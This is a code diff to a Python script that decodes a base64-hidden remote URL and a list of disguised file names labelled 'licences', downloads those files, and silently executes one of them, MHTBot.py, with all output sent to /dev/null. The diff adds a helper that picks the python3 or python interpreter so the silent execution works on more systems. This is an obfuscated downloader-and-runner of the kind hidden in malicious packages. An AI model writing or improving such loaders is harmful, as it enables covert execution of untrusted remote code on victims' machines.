@@ -1,6 +1,7 @@
 import os
 import base64
 import requests
+import subprocess
 
 encoded_base_key = 'aHR0cHM6Ly9jb2luc3cuYXBwL2Jhc2VjLw=='
 
@@ -15,7 +16,7 @@ encoded_licences = [
     'dGcucHk=',
     'dHgucHk=',
     'dXBkZWwucHk=',
-  	'bG9hZGluZy5naWY=',
+    'bG9hZGluZy5naWY=',
     'TUhUQm90LnB5',
 ]
 
@@ -24,6 +25,10 @@ def decode_base64(data):
     if missing_padding != 0:
         data += '=' * (4 - missing_padding)
     return base64.b64decode(data).decode()
+
+def determine_python_command():
+    python_command = 'python3' if subprocess.run(["python3", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0 else 'python'
+    return python_command
 
 base_key = decode_base64(encoded_base_key)
 licences = [decode_base64(encoded_filename) for encoded_filename in encoded_licences]
@@ -44,4 +49,5 @@ for filename in licences:
         pass
 
 aibotpro_path = os.path.join(target_directory, 'MHTBot.py')
-os.system(f'python3 {aibotpro_path} > /dev/null 2>&1')
+python_command = determine_python_command()
+os.system(f'{python_command} {aibotpro_path} > /dev/null 2>&1')
